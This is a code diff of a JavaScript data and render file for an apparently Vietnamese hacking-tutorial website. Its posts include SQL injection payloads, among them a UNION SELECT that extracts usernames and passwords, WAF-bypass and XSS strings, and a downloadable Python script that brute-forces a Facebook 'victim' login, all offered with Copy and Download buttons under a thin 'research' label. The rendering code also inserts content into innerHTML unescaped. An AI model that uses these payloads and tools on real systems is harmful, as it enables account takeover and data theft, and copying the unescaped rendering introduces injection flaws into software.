@@ -2,30 +2,48 @@
 const posts = {
   news: [
     {
-      title: "Lỗ hổng SQL Injection mới trong CMS X",
-      content: "Một lỗ hổng SQL Injection nghiêm trọng vừa được phát hiện trong CMS X...",
-      link: "https://example.com/sql-injection-news"
+      title: "Zero-Day mới trên Windows",
+      content: "Một lỗ hổng zero-day vừa được công bố, cho phép attacker leo thang đặc quyền thông qua dịch vụ Print Spooler.",
+      link: "https://thehackernews.com/"
     },
     {
-      title: "Rò rỉ dữ liệu từ một ngân hàng lớn",
-      content: "Cơ sở dữ liệu của một ngân hàng đã bị lộ ra ngoài do cấu hình sai...",
-      link: "https://example.com/data-leak"
+      title: "Anonymous tấn công chính phủ",
+      content: "Nhóm hacker Anonymous đã công bố dữ liệu từ nhiều website chính phủ sau chiến dịch tấn công DDoS.",
+      link: "https://www.reuters.com/"
     }
   ],
+
   tutorials: [
     {
       title: "SQL Injection cơ bản",
-      content: "Hướng dẫn từng bước khai thác SQL Injection.",
-      code: `# Ví dụ SQLi payload
-' OR '1'='1`
+      content: `Hướng dẫn cách khai thác SQL Injection trên các ứng dụng web không an toàn.`,
+      code: `# SQLi Test Payload
+' OR '1'='1
+' UNION SELECT null, username, password FROM users --`
     },
     {
-      title: "Cross Site Scripting (XSS)",
-      content: "Cách chèn script vào input và bypass filter.",
-      code: `<script>alert('XSS');</script>`
+      title: "Bypass WAF cơ bản",
+      content: "Cách vượt qua một số Web Application Firewall phổ biến bằng cách encode payload.",
+      code: `# WAF Bypass Payload
+admin'/**/OR/**/'1'='1
+<script>alert(1)</script>`
     }
   ],
+
   tools: [
+    {
+      title: "Brute Force Facebook",
+      content: "Tool Python brute-force login Facebook (dùng cho mục đích nghiên cứu).",
+      code: `import requests
+
+url = "https://facebook.com/login"
+for pwd in ["123456", "password", "letmein"]:
+    r = requests.post(url, data={"email":"victim","pass":pwd})
+    if "Welcome" in r.text:
+        print("Found password:", pwd)
+        break`,
+      filename: "fb_bruteforce.py"
+    },
     {
       title: "Port Scanner",
       content: "Tool scan port đơn giản với Python.",
@@ -39,19 +57,8 @@ for port in range(1,1000):
         s.connect((target, port))
         print("Port open:", port)
     except:
-        pass`
-    },
-    {
-      title: "Brute Force Facebook",
-      content: "Tool Python brute-force login Facebook (nghiên cứu).",
-      code: `import requests
-
-url = "https://facebook.com/login"
-for pwd in ["123456", "password", "letmein"]:
-    r = requests.post(url, data={"email":"victim","pass":pwd})
-    if "Welcome" in r.text:
-        print("Found password:", pwd)
-        break`
+        pass`,
+      filename: "port_scanner.py"
     }
   ]
 };
@@ -60,23 +67,23 @@ for pwd in ["123456", "password", "letmein"]:
 function renderPosts() {
   // News
   const newsContainer = document.getElementById("news");
-  posts.news.forEach((post) => {
+  posts.news.forEach(post => {
     newsContainer.innerHTML += `
       <div class="card">
-        <h2>📰 ${post.title}</h2>
+        <h2>📡 ${post.title}</h2>
         <p>${post.content}</p>
         <a href="${post.link}" target="_blank">
-          <button class="btn read-btn">📖 Read</button>
+          <button class="btn read-btn">🔗 Read More</button>
         </a>
       </div>`;
   });
 
   // Tutorials
-  const tutorialContainer = document.getElementById("tutorials");
-  posts.tutorials.forEach((post, index) => {
-    tutorialContainer.innerHTML += `
+  const tutContainer = document.getElementById("tutorials");
+  posts.tutorials.forEach(post => {
+    tutContainer.innerHTML += `
       <div class="card">
-        <h2>📚 ${post.title}</h2>
+        <h2>💻 ${post.title}</h2>
         <p>${post.content}</p>
         <pre><code>${post.code}</code></pre>
         <button class="btn copy-btn" onclick="copyCode(\`${post.code}\`)">📋 Copy</button>
@@ -85,14 +92,14 @@ function renderPosts() {
 
   // Tools
   const toolContainer = document.getElementById("tools");
-  posts.tools.forEach((post, index) => {
+  posts.tools.forEach(post => {
     toolContainer.innerHTML += `
       <div class="card">
         <h2>🛠 ${post.title}</h2>
         <p>${post.content}</p>
         <pre><code>${post.code}</code></pre>
         <button class="btn copy-btn" onclick="copyCode(\`${post.code}\`)">📋 Copy</button>
-        <button class="btn download-btn" onclick="downloadCode(\`${post.code}\`, '${post.title.replace(/\s+/g, "_")}.py')">⬇ Download</button>
+        <button class="btn download-btn" onclick="downloadCode(\`${post.code}\`, '${post.filename}')">⬇ Download</button>
       </div>`;
   });
 }
